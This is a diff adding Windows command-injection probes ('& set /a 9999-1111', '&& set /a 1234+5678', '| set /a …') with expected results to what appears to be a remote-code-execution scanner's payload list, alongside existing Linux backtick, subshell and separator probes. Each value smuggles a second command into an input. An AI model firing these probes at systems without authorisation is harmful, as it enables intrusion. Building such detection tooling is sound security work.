@@ -13,6 +13,14 @@
         {"payload": "`echo $((1234+5678))`", "type": "Linux math backtick (verification)"},
         {"payload": "$(echo $((1234+5678)))", "type": "Linux math subshell (verification)"},
 
+        {"payload": "& set /a 9999-1111", "type": "Windows math ampersand", "expected": "8888", "proof": "set /a 9999-1111"},
+        {"payload": "&& set /a 9999-1111", "type": "Windows math double-AND", "expected": "8888", "proof": "set /a 9999-1111"},
+        {"payload": "| set /a 9999-1111", "type": "Windows math pipe", "expected": "8888", "proof": "set /a 9999-1111"},
+
+        {"payload": "& set /a 1234+5678", "type": "Windows math ampersand (verification)", "expected": "6912", "proof": "set /a 1234+5678"},
+        {"payload": "&& set /a 1234+5678", "type": "Windows math double-AND (verification)", "expected": "6912", "proof": "set /a 1234+5678"},
+        {"payload": "| set /a 1234+5678", "type": "Windows math pipe (verification)", "expected": "6912", "proof": "set /a 1234+5678"},
+
         {"payload": "; echo rce_test_8888", "type": "Linux pure echo semicolon"},
         {"payload": "| echo rce_test_8888", "type": "Linux pure echo pipe"},
         {"payload": "|| echo rce_test_8888", "type": "Linux pure echo OR"},
